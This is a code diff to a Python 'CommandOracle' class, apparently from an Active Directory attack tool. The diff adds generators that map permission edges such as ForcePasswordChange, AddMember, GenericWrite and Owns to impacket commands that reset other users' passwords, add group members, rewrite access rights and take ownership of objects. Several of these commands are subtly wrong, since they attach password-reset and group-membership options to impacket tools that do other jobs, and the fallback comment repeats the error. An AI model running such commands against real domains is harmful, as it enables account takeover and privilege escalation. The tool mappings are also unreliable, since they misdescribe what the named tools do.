@@ -126,10 +126,77 @@ class CommandOracle:
                 f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
             )
 
+        # ForcePasswordChange / CanForceChangePassword
+        if normalized_edge in ("ForcePasswordChange", "CanForceChangePassword"):
+            target_user = target.name or "<TARGET_USER>"
+            # Extract username if it contains domain prefix
+            if "\\" in target_user:
+                target_user = target_user.split("\\", maxsplit=1)[1]
+            elif "@" in target_user:
+                target_user = target_user.split("@", maxsplit=1)[0]
+            
+            new_password = "<NEW_PASSWORD>"
+            return (
+                f"impacket-samrdump -newpass {new_password}{auth_part} {domain}/{username} "
+                f"{target_user}@{domain}"
+            )
+
+        # CanAddMember / AddMember
+        if normalized_edge in ("CanAddMember", "AddMember"):
+            target_group = target.name or "<TARGET_GROUP>"
+            if "@" in target_group:
+                target_group = target_group.split("@", maxsplit=1)[0]
+            
+            member_to_add = "<MEMBER_TO_ADD>"
+            return (
+                f"impacket-getST{auth_part} {domain}/{username} "
+                f"-add-group-member {target_group} {member_to_add}"
+            )
+
+        # AllExtendedRights
+        if normalized_edge == "AllExtendedRights":
+            if target.node_type == "user":
+                # AllExtendedRights on user = ResetPassword
+                target_user = target.name or "<TARGET_USER>"
+                if "\\" in target_user:
+                    target_user = target_user.split("\\", maxsplit=1)[1]
+                elif "@" in target_user:
+                    target_user = target_user.split("@", maxsplit=1)[0]
+                
+                new_password = "<NEW_PASSWORD>"
+                return (
+                    f"impacket-samrdump -newpass {new_password}{auth_part} "
+                    f"{domain}/{username} {target_user}@{domain}"
+                )
+            else:
+                # AllExtendedRights on other objects
+                target_object = target.name or target.id or "<TARGET_OBJECT>"
+                return (
+                    f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
+                    f"-target '{target_object}' {domain}/{username}"
+                )
+
+        # GenericWrite
+        if normalized_edge == "GenericWrite" or normalized_edge == "CanGenericWrite":
+            target_object = target.name or target.id or "<TARGET_OBJECT>"
+            return (
+                f"impacket-dacledit{auth_part} -action write -rights GenericWrite "
+                f"-target '{target_object}' {domain}/{username}"
+            )
+
+        # Owns
+        if normalized_edge == "Owns":
+            target_object = target.name or target.id or "<TARGET_OBJECT>"
+            return (
+                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
+                f"{domain}/{username}"
+            )
+
         tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
         return (
             f"# No direct automation for edge '{normalized_edge}'. Suggested tool: {tool}\n"
-            f"# Source: {source.name} -> Target: {target.name}"
+            f"# Source: {source.name} ({source.node_type}) -> Target: {target.name} ({target.node_type})\n"
+            f"# Use impacket-samrdump, impacket-getST, or similar tools based on the relationship type."
         )
 
     def get_kerberoast_command(self, target_node: dict[str, str]) -> str:
